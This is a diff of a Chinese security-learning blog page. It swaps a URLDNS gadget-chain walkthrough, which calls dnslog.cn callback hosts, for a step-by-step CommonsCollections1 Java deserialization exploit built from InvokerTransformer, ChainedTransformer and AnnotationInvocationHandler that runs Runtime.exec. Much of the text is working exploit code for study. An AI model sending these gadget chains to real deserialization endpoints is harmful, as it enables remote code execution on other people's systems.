@@ -4,9 +4,9 @@
 
 <head>
     <meta charset="utf-8">
-    <meta name="keywords" content="urldns链利用, MajorT&#39;s Blog">
-    <meta name="description" content="天生我材必有用，千金散尽还复来
-三个部分反序列化调用主要分为三个部分，入口类，调用链，危险函数。入口类：含readObject()函数；调用链：入口类的readObject()函数中调用了其他类的函数，一层层调用下去，最终到达危险函数；危险">
+    <meta name="keywords" content="CommonsCollections1链手写利用, MajorT&#39;s Blog">
+    <meta name="description" content="竹杖芒鞋轻胜马，何妨吟啸且徐行
+什么是CommonsCollections？Commons由三部分组成：Proper（是一些已发布的项目）、sandbox（是一些正在开发的项目）和Dormant（是一些刚启动或者已经停止维护的项目）。Com">
     <meta http-equiv="X-UA-Compatible" content="IE=edge">
     <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
     <meta name="renderer" content="webkit|ie-stand|ie-comp">
@@ -18,7 +18,7 @@
     <!-- Global site tag (gtag.js) - Google Analytics -->
 
 
-    <title>urldns链利用 | MajorT&#39;s Blog</title>
+    <title>CommonsCollections1链手写利用 | MajorT&#39;s Blog</title>
     <link rel="icon" type="image/png" href="/favicon.png">
     
 
@@ -333,12 +333,12 @@
 
 
 
-<div class="bg-cover pd-header post-cover" style="background-image: url('/medias/featureimages/3.jpg')">
+<div class="bg-cover pd-header post-cover" style="background-image: url('/medias/featureimages/7.jpg')">
     <div class="container" style="right: 0px;left: 0px;">
         <div class="row">
             <div class="col s12 m12 l12">
                 <div class="brand">
-                    <h1 class="description center-align post-title">urldns链利用</h1>
+                    <h1 class="description center-align post-title">CommonsCollections1链手写利用</h1>
                 </div>
             </div>
         </div>
@@ -391,21 +391,21 @@
                 
                 <div class="post-date info-break-policy">
                     <i class="far fa-calendar-minus fa-fw"></i>发布日期:&nbsp;&nbsp;
-                    2024-03-22
+                    2024-03-26
                 </div>
                 
 
                 
                 <div class="post-date info-break-policy">
                     <i class="far fa-calendar-check fa-fw"></i>更新日期:&nbsp;&nbsp;
-                    2024-03-22
+                    2024-03-26
                 </div>
                 
 
                 
                 <div class="info-break-policy">
                     <i class="far fa-file-word fa-fw"></i>文章字数:&nbsp;&nbsp;
-                    1.5k
+                    2.7k
                 </div>
                 
 
@@ -427,24 +427,28 @@
 
         <div class="card-content article-card-content">
             <div id="articleContent">
-                <p><em><strong>天生我材必有用，千金散尽还复来</strong></em></p>
-<h1><span id="三个部分">三个部分</span></h1><p>反序列化调用主要分为三个部分，入口类，调用链，危险函数。<br>入口类：含readObject()函数；<br>调用链：入口类的readObject()函数中调用了其他类的函数，一层层调用下去，最终到达危险函数；<br>危险函数：可以被攻击者利用执行命令或探测的函数。</p>
-<h1><span id="调用链">调用链</span></h1><p>urldns链触发原因为同名函数调用。<br>Gadget为：HashMap(put)-&gt;HashMap(putVal)-&gt;HashMap(hash)-&gt;URL(hashCode)</p>
-<h1><span id="代码分析">代码分析</span></h1><p>根据前一章的知识，首先来写一个序列化的类和一个反序列化的类（复习）。<br>序列化类代码：</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">import java.io.FileOutputStream;</span><br><span class="line">import java.io.IOException;</span><br><span class="line">import java.io.ObjectOutputStream;</span><br><span class="line">public class Serializable &#123;</span><br><span class="line">	public static void ser(Object obj) throws IOException &#123;</span><br><span class="line">		ObjectOutputStream out = new ObjectOutputStream(new FileOutputStream(&quot;url.ser&quot;));</span><br><span class="line">		out.writeObject(obj);</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-<p>反序列化代码：</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">import java.io.FileInputStream;</span><br><span class="line">import java.io.FileNotFoundException;</span><br><span class="line">import java.io.IOException;</span><br><span class="line">import java.io.ObjectInputStream;</span><br><span class="line">public class unSerializable &#123;</span><br><span class="line">	public static void main(String[] args) throws IOException, ClassNotFoundException &#123;</span><br><span class="line">		ObjectInputStream in = new ObjectInputStream(new FileInputStream(&quot;url.ser&quot;));</span><br><span class="line">		Object obj = (Object) in.readObject();</span><br><span class="line">		System.out.println(obj);</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-<p>接下来写利用代码，在编写代码前，我们先来介绍一下HashMap类。<br>HashMap是一种为了提升操作效率的数据结构，本质在使用上还是存取key-value键值对的使用方式，但是在实现上引入了key值的HASH映射到一维数组的形式来实现，再进入了链表来解决hash碰撞问题。<br>从键值对的设置和读取两方面来解释：<br>设置键值对key-value：<br>1）计算key的hash，即Hash(k)；<br>2）通过Hash(k)映射到有限的数组a的位置i；<br>3）在a[i]的位置存入value；<br>4）因为把计算出来的不同的key的hash映射到有限的数组长度，肯定会出现不同的key对应同一个数组位置i的情况。如果发现a[i]已经有了其他key的value，就放入这个i位置后面对应的链表（根据多少的情况可能变为树）中。</p>
-<p>读取key的value：<br>1）计算key的hash，即Hash(k)；<br>2）通过Hash(k)映射到有限的数组a的位置i；<br>3）读取在a[i]的位置的value；<br>4）如果发现a[i]已经有了其他key的value，就遍历这个i位置后面对应的链表（根据情况多少可能变为树）去查找这个key再去取值。</p>
-<p>利用代码：</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">import java.io.IOException;</span><br><span class="line">import java.net.MalformedURLException;</span><br><span class="line">import java.net.URL;</span><br><span class="line">import java.util.HashMap;</span><br><span class="line">public class urldnstest &#123;</span><br><span class="line">	public static void main(String[] args) throws IOException &#123;</span><br><span class="line">		HashMap&lt;URL, Integer&gt; hashMap = new HashMap&lt;URL, Integer&gt;();</span><br><span class="line">		URL url = new URL(&quot;http://uthvkq.dnslog.cn&quot;);</span><br><span class="line">		hashMap.put(url, 1);</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-<p>执行后收到dnslog请求：<br><img src="/images/2/Image1.png" alt="img1"><br>这里没有用到序列化和反序列化函数，我们先放在一边，debug跟进调试一下。<br>将断点打在put函数那一行：<br><img src="/images/2/Image2.png" alt="img2"><br>跟进去到了HashMap类的put函数中：<br><img src="/images/2/Image3.png" alt="img3"><br>继续跟进，到了hash函数中：<br><img src="/images/2/Image4.png" alt="img4"><br>继续，到了URL类：<br><img src="/images/2/Image5.png" alt="img5"><br>在URL类中，hashCode值为-1，所以没有进入if，而是执行下面的hashCode函数：<br><img src="/images/2/Image6.png" alt="img6"><br>在hashCode函数中，执行的是一些解析操作，在这个过程中，dnslog会接收到请求，从而完成了整个触发过程。<br>接下来，我们只需要调用序列化函数，将这个过程序列化，当服务器在反序列化的过程中，就会执行我们的利用代码，将请求发送至dnslog平台。<br>（如果看到此处你有一些疑问，请接着看下去）<br>调用序列化函数：<br><img src="/images/2/Image7.png" alt="img7"><br>执行后在左侧项目栏中可以看到生成了一个url.ser文件，同时，dnslog也接收到了请求。<br><img src="/images/2/Image8.png" alt="img8"><br>好了，刚才有些有基础的小伙伴可能会发出这样的疑问：反序列化漏洞，你在序列化的时候就给我触发了，那我反序列化的时候触发个毛啊？<br>好问题。</p>
-<p>接下来我们来分析，序列化的时候什么地方是它触发的关键转折，以及怎样让它不触发。<br>回顾刚才，我们可以看到，在URL类的hashCode函数中，如下写道：<br><img src="/images/2/Image9.png" alt="img9"><br>这里会判断hashCode的值是否为-1，刚才序列化时，该值为-1，所以继续走到了最终解析我们传入域名的hashCode函数中，所以，如果我们让它的值在序列化时不等于-1，而在反序列化时等于-1，是否就能达到我们想要的效果了呢？<br>但是，我们要怎么做才能改变它的值呢？<br>没错，反射。</p>
-<p>利用反射实现urldns链的有效利用：<br>代码如下：</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">public class urldnstest &#123;</span><br><span class="line">	public static void main(String[] args) throws IOException, NoSuchMethodException, NoSuchFieldException, IllegalAccessException &#123;</span><br><span class="line">		HashMap&lt;URL, Integer&gt; hashMap = new HashMap&lt;URL, Integer&gt;();</span><br><span class="line">		URL url = new URL(&quot;http://j31px5.dnslog.cn&quot;);</span><br><span class="line">		Class c = url.getClass();</span><br><span class="line">		Field urlfield = c.getDeclaredField(&quot;hashCode&quot;); //获取属性（私有属性）</span><br><span class="line">		urlfield.setAccessible(true);</span><br><span class="line">		urlfield.set(url, 1); //设置参数的值为1</span><br><span class="line">		hashMap.put(url, 1);</span><br><span class="line">		Serializable.ser(hashMap);</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-<p>这次dnslog平台已不会接收到请求。<br>另外，在反序列化的时候让hashCode的值重新等于-1，只需要在调用序列化函数之前添加一行urlfield.set(url, -1)<br>再次执行重新生成url.ser后，执行反序列化函数代码，成功在平台接收到请求：<br><img src="/images/2/Image10.png" alt="img10"><br>至此，urldns链的利用已分析完成。这是一个比较简单的利用链，但是作为一个新手，也翻来覆去看了好几遍哈哈，好在收获不浅。<br>这个链虽然没有办法直接执行代码，但是这个链不需要其他的依赖，原生java就能调用成功，同时也是我们做渗透时点到为止利用的一个好途径。</p>
-<h1><span id="ysoserial工具利用">ysoserial工具利用</span></h1><p>使用攻击生成payload：<br><img src="/images/2/Image11.png" alt="img11"><br>将其复制到项目文件夹下：<br><img src="/images/2/Image12.png" alt="img12"><br>反序列化执行：<br><img src="/images/2/Image13.png" alt="img13"><br>成功接收到请求：<br>【假装有图】，手贱一不小心刷新了，栓q。</p>
-<h3><span id="参考链接">参考链接：</span></h3><p><a target="_blank" rel="noopener" href="https://cloud.tencent.com/developer/article/2277485">https://cloud.tencent.com/developer/article/2277485</a></p>
+                <p><em><strong>竹杖芒鞋轻胜马，何妨吟啸且徐行</strong></em></p>
+<h1><span id="什么是commonscollections">什么是CommonsCollections？</span></h1><p>Commons由三部分组成：Proper（是一些已发布的项目）、sandbox（是一些正在开发的项目）和Dormant（是一些刚启动或者已经停止维护的项目）。<br>CommonsCollections包为java标砖的Collections API提供了相当好的补充。在此基础上对其常用的数据结构操作进行了很好的封装、抽象和补充。让我们在开发应用程序的过程中，既保证了性能，同时也能大大简化代码。<br>Commons都是一些集合类，集合类一般都可以接收任意对象。</p>
+<h1><span id="环境搭建">环境搭建</span></h1><p>参考：<br>1、<a target="_blank" rel="noopener" href="https://blog.csdn.net/qq_63928796/article/details/129591227">https://blog.csdn.net/qq_63928796/article/details/129591227</a><br>2、组长的视频</p>
+<h1><span id="代码思路分析">代码思路分析</span></h1><p>已知危险方法为Transformer接口的transform方法。<br><img src="/images/3/Image1.png" alt="img1"><br>点击左侧的小绿标可查看实现了该接口的类：<br><img src="/images/3/Image2.png" alt="img2"><br>找到了InvokerTransformer中的transform方法为危险方法：<br><img src="/images/3/Image3.png" alt="img3"><br>上述代码逻辑：<br>接收一个类，并反射调用类的方法。<br>接下来找一下iMethodName和iParamTypes参数从哪获取，找一下构造函数。<br><img src="/images/3/Image4.png" alt="img4"><br>可以看到，在构造函数中，为iMethodName和iParamTypes赋值了<br>很好，也就是说，该函数中所有参数都是用户可控的，我们来写一个调用：<br>普通调用：<br><img src="/images/3/Image5.png" alt="img5"><br>反射调用：<br><img src="/images/3/Image6.png" alt="img6"><br>调用transform方法：<br><img src="/images/3/Image7.png" alt="img7"><br>经过测试，该方法可以被成功利用，接下来我们倒推，去找它的利用链：<br>谁调用了transform方法？<br>TransformedMap类：<br><img src="/images/3/Image8.png" alt="img8"><br>在该类的checkSetValue方法中，valueTransformer调用了transform方法，看看valueTransformer是什么？<br>tansformer接口定义的一个参数<br><img src="/images/3/Image9.png" alt="img9"><br>构造方法中传入了该参数的值：<br><img src="/images/3/Image10.png" alt="img10"><br>所以，我们只要在该构造方法中传入invokerTransformer对象，就会调用它的transformer危险方法。<br>该构造方法被protected修饰，我们看看有没有调用。<br>在同一个类中，decorate方法调用了构造方法：<br><img src="/images/3/Image11.png" alt="img11"><br>所以，我们要在decorate方法中，将valueTransformer的值设置为InvokerTransformer的对象。<br>这样，在checkSetValue方法中调用的就是InvokerTransformer对象的transformer危险方法了。<br>虽然有了上述调用，但是在checkSetValue方法中，传入的参数却不知道是否可控。<br><img src="/images/3/Image12.png" alt="img12"><br>所以接下来，我们需要去找，谁调用了checkSetValue方法。<br>只有一个调用，在MapEntry类中<br><img src="/images/3/Image13.png" alt="img13"><br>谁调用了setValue？<br><img src="/images/3/Image14.png" alt="img14"><br>结果太多，但是我们可以根据entry这个名称来分析理解一下。<br>什么是entry？<br>Entry类概述：<br>    java的entry是一个静态内部类，实现Map.Entry&lt;k,v&gt;这个接口，通过entry类可以构成一个单向链表。<br>java中的Map以及Map.Entry<br>    1）Map是java中的接口，Map.Entry；<br>    2）Map提供了一些常用方法，如keySet()、entrySet()等方法；<br>    3）keySet()方法返回值是Map中key值的集合，entrySet()的返回值也是返回一个Set集合，此集合的类型为Map.Entry；<br>    4）Map.Entry是Map声明的一个内部接口，此接口为泛型，定义为Entry&lt;K, V&gt;。它表示Map中的一个实体（一个key-value对）。接口中有getKey(), getValue方法。</p>
+<p>所以这个setValue，其实就是Map中的setValue，我们遍历entry时调用即可。<br><img src="/images/3/Image15.png" alt="img15"><br>一个entry即一个Map键值对，我们新建一个Map为其赋值，并遍历，代码如下：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">public class ccTest &#123;</span><br><span class="line">	public static void main(String[] args) throws Exception &#123;</span><br><span class="line">		//Runtime.getRuntime().exec(&quot;calc&quot;);</span><br><span class="line">		Runtime runtime = Runtime.getRuntime();</span><br><span class="line">		// Class c = runtime.getClass();</span><br><span class="line">		// Method runtimeMethod = c.getDeclaredMethod(&quot;exec&quot;, String.class);</span><br><span class="line">		// runtimeMethod.setAccessible(true);</span><br><span class="line">		// runtimeMethod.invoke(runtime, &quot;calc&quot;);</span><br><span class="line">		InvokerTransformer invokerTransformer = new InvokerTransformer(&quot;exec&quot;, new Class[]&#123;String.class&#125;, new Object[]&#123;&quot;calc&quot;&#125;);</span><br><span class="line">		//invokerTransformer.transform(runtime);</span><br><span class="line">		//创建map对象</span><br><span class="line">		HashMap&lt;Object, Object&gt; map = new HashMap&lt;&gt;();</span><br><span class="line">		//对象赋值</span><br><span class="line">		map.put(&quot;1&quot;, &quot;11&quot;);</span><br><span class="line">		//调用decorate方法，该方法返回一个map，并将valueTransformer参数赋值为invokerTransformer（InvokerTransformer类）</span><br><span class="line">		Map&lt;Object, Object&gt; checksetValue = TransformedMap.decorate(map, null, invokerTransformer);</span><br><span class="line">		//遍历，调用entry的setValue方法会调用到MapEntry的setValue方法，进而调用到TransformedMap的checkSetValue方法</span><br><span class="line">		for(Map.Entry entry : checksetValue.entrySet())&#123;</span><br><span class="line">			entry.setValue(runtime);</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>执行成功：<br><img src="/images/3/Image16.png" alt="img16"><br>所以，只要我们找到一个遍历了数组的地方且调用了setValue，最好是在readObject里面，那么我们就找到了入口类。<br>可以看到在AnnotationInvocationHandler类中readObject方法中直接调用了setValue方法：<br><img src="/images/3/Image17.png" alt="img17"><br>接下来分析参数是否我们可控：<br>可以看到，memberValue的值是根据memberValues得到的<br><img src="/images/3/Image18.png" alt="img18"><br>memberValues的值可以在构造函数中由我们控制<br><img src="/images/3/Image19.png" alt="img19"><br>第一个参数Annotation是java中的注解，比如重写时的@Override就是注解。<br>要注意的是，这个类没有public修饰，那么它就是default，也就是我们需要反射调用。<br>代码如下：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">public static void main(String[] args) throws Exception &#123;</span><br><span class="line">	Runtime runtime = Runtime.getRuntime();</span><br><span class="line">	InvokerTransformer invokerTransformer = new InvokerTransformer(&quot;exec&quot;, new Class[]&#123;String.class&#125;, new Object[]&#123;&quot;calc&quot;&#125;);</span><br><span class="line">	//创建map对象</span><br><span class="line">	HashMap&lt;Object, Object&gt; map = new HashMap&lt;&gt;();</span><br><span class="line">	//对象赋值</span><br><span class="line">	map.put(&quot;1&quot;, &quot;11&quot;);</span><br><span class="line">	//调用decorate方法，该方法返回一个map，并将valueTransformer参数赋值为invokerTransformer（InvokerTransformer类）</span><br><span class="line">	Map&lt;Object, Object&gt; checksetValue = TransformedMap.decorate(map, null, invokerTransformer);</span><br><span class="line">	Class c = Class.forName(&quot;sun.reflect.annotation.AnnotationInvocationHandler&quot;);</span><br><span class="line">	Constructor annotationInvocationHandlerConstructor = c.getDeclaredConstructor(Class.class, Map.class);</span><br><span class="line">	Object o = annotationInvocationHandlerConstructor.newInstance(Override.class, checksetValue);</span><br><span class="line">	serilization(o);</span><br><span class="line">	unserilization(&quot;cc.ser&quot;);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>序列化和反序列化函数代码如下：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">public static void serilization(Object o) throws IOException &#123;</span><br><span class="line">	ObjectOutputStream objectOutputStream = new ObjectOutputStream(new FileOutputStream(&quot;cc.ser&quot;));</span><br><span class="line">	objectOutputStream.writeObject(o);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">public static Object unserilization(String filename) throws IOException, ClassNotFoundException &#123;</span><br><span class="line">	ObjectInputStream objectInputStream = new ObjectInputStream(new FileInputStream(filename));</span><br><span class="line">	Object o = objectInputStream.readObject();</span><br><span class="line">	return o;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>写到这里，代码中还存在两个问题。<br>1.在入口类调用setValue方法时的参数值是否可控，我们怎么把runtime对象传进去？<br>2.runtime类没有继承Serializable，无法被序列化。<br>第二个问题解决：Runtime不可以序列化，但是它的class是可以序列化的。<br>首先写一个正常情况下的反射调用：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">Class c = Runtime.class;</span><br><span class="line">//获取runtime的getRuntime方法</span><br><span class="line">Method runtimeMethod = c.getDeclaredMethod(&quot;getRuntime&quot;, null);</span><br><span class="line">//getruntime方法返回一个Runtime对象</span><br><span class="line">Runtime r = (Runtime) runtimeMethod.invoke(null, null);</span><br><span class="line">//获取runtime的exec方法</span><br><span class="line">Method getruntimeMethod = c.getMethod(&quot;exec&quot;, String.class);</span><br><span class="line">//传入对象和参数值执行</span><br><span class="line">getruntimeMethod.invoke(r, &quot;calc&quot;);</span><br></pre></td></tr></table></figure>
+<p>执行：<br><img src="/images/3/Image20.png" alt="img20"><br>将其转换为InvokerTransformer格式，代码如下（这里不要只看，一定要敲代码，才能理解）：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">Method runtimeMethod = (Method) new InvokerTransformer(&quot;getMethod&quot;, new Class[]&#123;String.class, Class[].class&#125;, new Object[]&#123;&quot;getRuntime&quot;, null&#125; ).transform(Runtime.class);</span><br><span class="line">//即Runtime r = (Runtime) runtimeMethod.invoke(null, null);</span><br><span class="line">Runtime runtime = (Runtime) new InvokerTransformer(&quot;invoke&quot;, new Class[]&#123;Object.class, Object[].class&#125;, new Object[]&#123;null, null&#125;).transform(runtimeMethod);</span><br><span class="line">//即getruntimeMethod.invoke(r, &quot;calc&quot;);</span><br><span class="line">new InvokerTransformer(&quot;exec&quot;, new Class[]&#123;String.class&#125;, new Object[]&#123;&quot;calc&quot;&#125;).transform(runtime);</span><br></pre></td></tr></table></figure>
+<p>执行：<br><img src="/images/3/Image21.png" alt="img21"><br>写完后，我们可以发现，这是一个链式结构，而有一个实现了Transformer接口的类，叫ChainedTransformer，其中刚好就有链式调用的方法，即将前一个的输出作为后一个的输入：<br><img src="/images/3/Image22.png" alt="img22"><br>所以代码又可以改写为如下形式：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">Transformer transformer[] = new Transformer[]&#123;</span><br><span class="line">new InvokerTransformer(&quot;getMethod&quot;, new Class[]&#123;String.class, Class[].class&#125;, new Object[]&#123;&quot;getRuntime&quot;, null&#125; ),</span><br><span class="line">new InvokerTransformer(&quot;invoke&quot;, new Class[]&#123;Object.class, Object[].class&#125;, new Object[]&#123;null, null&#125;),</span><br><span class="line">new InvokerTransformer(&quot;exec&quot;, new Class[]&#123;String.class&#125;, new Object[]&#123;&quot;calc&quot;&#125;)</span><br><span class="line">&#125;;</span><br><span class="line">ChainedTransformer chainedTransformer = new ChainedTransformer(transformer);</span><br><span class="line">chainedTransformer.transform(Runtime.class);</span><br></pre></td></tr></table></figure>
+<p>我们TransformedMap中decorate方法中对invokerTransformer对象的调用改为chainedTransformer<br>此时完整代码如下：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line">public class ccTest &#123;</span><br><span class="line">	public static void main(String[] args) throws Exception &#123;</span><br><span class="line"></span><br><span class="line">		Transformer transformer[] = new Transformer[]&#123;</span><br><span class="line">			new InvokerTransformer(&quot;getMethod&quot;, new Class[]&#123;String.class, Class[].class&#125;, new Object[]&#123;&quot;getRuntime&quot;, null&#125; ),</span><br><span class="line">			new InvokerTransformer(&quot;invoke&quot;, new Class[]&#123;Object.class, Object[].class&#125;, new Object[]&#123;null, null&#125;),</span><br><span class="line">			new InvokerTransformer(&quot;exec&quot;, new Class[]&#123;String.class&#125;, new Object[]&#123;&quot;calc&quot;&#125;)</span><br><span class="line">		&#125;;</span><br><span class="line">		ChainedTransformer chainedTransformer = new ChainedTransformer(transformer);</span><br><span class="line">		//chainedTransformer.transform(Runtime.class);</span><br><span class="line">		// Runtime runtime = Runtime.getRuntime();</span><br><span class="line">		// InvokerTransformer invokerTransformer = new InvokerTransformer(&quot;exec&quot;, new Class[]&#123;String.class&#125;, new Object[]&#123;&quot;calc&quot;&#125;);</span><br><span class="line">		//创建map对象</span><br><span class="line">		HashMap&lt;Object, Object&gt; map = new HashMap&lt;&gt;();</span><br><span class="line">		//对象赋值</span><br><span class="line">		map.put(&quot;1&quot;, &quot;11&quot;);</span><br><span class="line">		//调用decorate方法，该方法返回一个map，并将valueTransformer参数赋值为invokerTransformer（InvokerTransformer类）</span><br><span class="line">		Map&lt;Object, Object&gt; checksetValue = TransformedMap.decorate(map, null, chainedTransformer);</span><br><span class="line">		Class c = Class.forName(&quot;sun.reflect.annotation.AnnotationInvocationHandler&quot;);</span><br><span class="line">		Constructor annotationInvocationHandlerConstructor = c.getDeclaredConstructor(Class.class, Map.class);</span><br><span class="line">		annotationInvocationHandlerConstructor.setAccessible(true);</span><br><span class="line">		Object o = annotationInvocationHandlerConstructor.newInstance(Override.class, checksetValue);</span><br><span class="line">		serilization(o);</span><br><span class="line">		unserilization(&quot;cc.ser&quot;);</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	public static void serilization(Object o) throws IOException &#123;</span><br><span class="line">		ObjectOutputStream objectOutputStream = new ObjectOutputStream(new FileOutputStream(&quot;cc.ser&quot;));</span><br><span class="line">		objectOutputStream.writeObject(o);</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	public static Object unserilization(String filename) throws IOException, ClassNotFoundException &#123;</span><br><span class="line">		ObjectInputStream objectInputStream = new ObjectInputStream(new FileInputStream(filename));</span><br><span class="line">		Object o = objectInputStream.readObject();</span><br><span class="line">		return o;</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>runtime无法序列化的问题解决了，接下来解决第一个问题：<br>在入口类调用setValue方法时的参数值是否可控，我们怎么把runtime对象传进去？以及绕过两个if进入我们想要的地方<br><img src="/images/3/Image23.png" alt="img23"><br>在第一个if处下断点，看怎么走<br><img src="/images/3/Image24.png" alt="img24"><br>debug<br>可以看到，type就是override<br><img src="/images/3/Image25.png" alt="img25"><br>走到第一个if的时候，看到membertype的值为null，所以并不会进到我们想要的地方<br><img src="/images/3/Image26.png" alt="img26"><br>memberType指的是override的成员变量，进去override看一下：<br><img src="/images/3/Image27.png" alt="img27"><br><img src="/images/3/Image28.png" alt="img28"><br>没有成员变量，那我们将override改为target试试，target有一个成员方法value<br><img src="/images/3/Image29.png" alt="img29"><br>debug：<br>这里menbertype依然为null，因为我们再代码中为key赋值为1，应该赋值为value：<br><img src="/images/3/Image30.png" alt="img30"><br><img src="/images/3/Image31.png" alt="img31"><br>再次跟进去后，可以进入if<br><img src="/images/3/Image32.png" alt="img32"><br>此时还剩一个问题待解决，setvalue将值设置为了如上图所示，但我们想要的是Runtime.getRuntime<br>跟进去看看：<br><img src="/images/3/Image33.png" alt="img33"><br>此时的value值我们看看是否可以控制。<br>这时需要用到另一个类叫ConstantTransformer<br><img src="/images/3/Image34.png" alt="img34"><br>它重写了transform方法，该方法为接收任意一个输入，返回一个常量，这个常量是什么呢？<br><img src="/images/3/Image35.png" alt="img35"><br>在它的构造函数里，这个常量由我们控制。不管改函数传入的参数值是什么，它只会返回由我们控制的常量。所以，我们如果把Runtime.getRuntime赋值给常量，即使我们不能控制value参数，当调用ConstantTransformer的transform时，只是会返回常量，也就是Runtime.getRuntime。<br>AnnotationInvocationHandler的setValue最终会调用到下图，最后return在构造constantTransformer时传入的常量也就是Runtime.getRuntime。<br><img src="/images/3/Image36.png" alt="img36"><br><img src="/images/3/Image37.png" alt="img37"><br>最后成功执行：<br><img src="/images/3/Image38.png" alt="img38"></p>
+<h1><span id="总结">总结</span></h1><p>梳理一下整个流程：<br>1.危险方法为InvokeTransformer中的transform函数；<br>2.TransformedMap类中的checkSetValue方法调用了transform方法；<br><img src="/images/3/Image39.png" alt="img39"><br>2.1 valueTransformer值由构造函数获取，构造函数的值由decorate函数传入；<br><img src="/images/3/Image40.png" alt="img40"><br><img src="/images/3/Image41.png" alt="img41"><br>2.2 value的值需要查找谁调用了checkSetValue方法来寻找是否我们可控；<br>3.AbstractInputCheckedMapDecorator类的内部类MapEntry类中的setValue方法调用了checkSetValue方法；<br><img src="/images/3/Image42.png" alt="img42"><br>3.1 entry代表一个键值对，找到遍历Map的地方，调用setValue赋值为Runtime即可<br>4.AnnotationInvocationHandler类的readObject方法调用了setValue函数，入口类找到了；<br><img src="/images/3/Image43.png" alt="img43"><br>4.1 memberValue的值在构造函数中传入，该类权限为default，需要反射调用其构造方法。</p>
